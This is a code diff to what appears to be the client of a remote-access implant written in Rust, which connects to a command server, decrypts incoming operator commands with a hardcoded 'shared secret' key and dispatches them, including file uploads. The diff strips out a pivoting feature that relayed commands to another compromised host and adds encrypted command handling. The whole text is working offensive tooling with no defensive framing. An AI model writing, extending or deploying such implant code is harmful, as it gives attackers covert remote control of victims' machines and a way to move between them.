@@ -5,11 +5,10 @@ use std::{thread,
     time::Duration,
     collections::HashMap};
 use clap::{Command, arg};
-use simple_crypt::{encrypt, decrypt};
+use simple_crypt::{decrypt, encrypt};
 mod utils;
 
 use utils::ImportedScript;
-use utils::PIVOT_STREAM;
 fn main() {
     let mut host = "127.0.0.1".to_string();
     let mut port = "8080".to_string();
@@ -41,27 +40,19 @@ fn main() {
                 stream.write(&encrypted_data).unwrap();
                 loop {
                     let mut buffer = [0; 1024];
-                    let n = match stream.read(&mut buffer) {
-                        Ok(n) => n,
+                    let _ = match stream.read(&mut buffer) {
+                        Ok(n) => {n},
                         Err(_) => break,
                     };
-                    let command = String::from_utf8(buffer[..n].to_vec()).unwrap();
+                    if buffer[0] == 0 {
+                        continue;
+                    }
+                    let data = decrypt(&buffer, b"shared secret").expect("Failed to decrypt");
+                    let command = String::from_utf8(data.to_vec()).unwrap();
                     let command_clone = command.clone();
                     print!("\rReceived command from server: {}", command);
                     std::io::stdout().flush().unwrap();
-                    let mut stream_to_use = &mut stream;
-                    let mut pivot_stream_option = PIVOT_STREAM.lock().unwrap();
-                    if command.contains("||PIVOTCMD||") {
-                        if let Some(pivot_stream) = pivot_stream_option.as_mut() {
-                            stream_to_use = pivot_stream;
-                            let mut modified_command = command.clone();
-                            modified_command = modified_command.replace("||PIVOTCMD|| ", "");
-                            stream_to_use.write(modified_command.as_bytes()).expect("failed to write");
-                        } else {
-                            stream.write(b"Not using pivot").expect("failed to write");
-                            continue;
-                        }
-                    }
+                    let stream_to_use = &mut stream;
                     if command_clone.starts_with("||UPLOAD||") {
                         let output = utils::handle_upload(stream_to_use, &command_clone);
                         match output {
